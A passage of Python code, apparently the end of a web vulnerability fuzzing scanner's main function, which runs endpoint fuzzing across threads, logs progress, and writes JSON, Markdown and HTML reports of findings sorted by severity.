    log_info(f"Starting fuzz engine with {args.threads} threads...")
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(scanner.fuzz_endpoint, ep): ep for ep in all_endpoints}
        done = 0
        total = len(futures)
        for future in as_completed(futures):
            done += 1
            if done % 50 == 0 or done == total:
                log_info(f"Progress: {done}/{total} endpoint sets complete | "
                         f"Findings so far: {len(scanner.vulnerabilities)}")
            try:
                future.result()
            except Exception as e:
                ep = futures[future]
                log_err(f"Thread crash on {ep.get('url','?')}: {e}")

    # ── Reports ────────────────────────────────────────────────────────────
    vulns = scanner.vulnerabilities
    log_good(f"\n{'='*60}")
    log_good(f"Scan complete: {len(vulns)} confirmed findings on {domain}")
    log_good(f"{'='*60}\n")

    write_json_report(vulns, args.out_json)
    write_markdown_report(vulns, args.out_md, domain)
    write_html_report(vulns, args.out_html, domain)

    # Print top findings to terminal
    if vulns:
        crits = [v for v in vulns if v["severity"] == "CRITICAL"]
        print("\n── Top Findings ─────────────────────────────────────────")
        for v in sorted(vulns, key=_severity_order)[:10]:
            print(f"  [{v['severity']}] {v['parameter']} ({v['location']}) "
                  f"→ {v['finding_type']}")
            if v.get("cve"):
                print(f"         CVE: {v['cve']}")
            print(f"         URL: {v['target_url'][:100]}")
            print(f"         Evidence: {v['evidence'][:80]!r}\n")


if __name__ == "__main__":
    main()
